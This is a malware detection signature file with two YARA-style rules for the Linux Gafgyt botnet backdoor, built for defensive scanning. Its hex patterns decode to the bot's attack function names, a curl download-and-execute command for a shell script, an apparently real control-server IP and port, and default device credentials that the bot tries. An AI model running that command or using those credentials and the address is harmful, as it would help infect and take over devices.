
rule Backdoor_Linux_Gafgyt_DF_MTB{
	meta:
		description = "Backdoor:Linux/Gafgyt.DF!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {73 6f 63 6b 65 74 5f 61 74 74 61 63 6b } //1 socket_attack
		$a_01_1 = {62 6f 74 2e 63 } //1 bot.c
		$a_01_2 = {75 64 70 5f 61 74 74 61 63 6b } //1 udp_attack
		$a_01_3 = {76 73 65 5f 61 74 74 61 63 6b } //1 vse_attack
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule Backdoor_Linux_Gafgyt_DF_MTB_2{
	meta:
		description = "Backdoor:Linux/Gafgyt.DF!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,07 00 07 00 06 00 00 "
		
	strings :
		$a_01_0 = {2e 73 68 3b 20 63 75 72 6c 20 2d 4f 20 68 74 74 70 3a 2f 2f 25 73 2f 63 61 74 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 63 61 74 2e 73 68 3b 20 73 68 20 63 61 74 2e 73 68 3b } //2 .sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh;
		$a_01_1 = {39 32 2e 31 31 33 2e 32 39 2e 32 33 32 3a 38 31 } //2 92.113.29.232:81
		$a_01_2 = {5b 30 6d 57 72 6f 6e 67 20 70 61 73 73 77 6f 72 64 21 } //1 [0mWrong password!
		$a_01_3 = {5b 30 6d 4e 6f 20 73 68 65 6c 6c 20 61 76 61 69 6c 61 62 6c 65 } //1 [0mNo shell available
		$a_01_4 = {74 65 6c 65 63 6f 6d 61 64 6d 69 6e } //1 telecomadmin
		$a_01_5 = {6b 6c 76 31 32 33 34 } //1 klv1234
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*2+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=7
 
}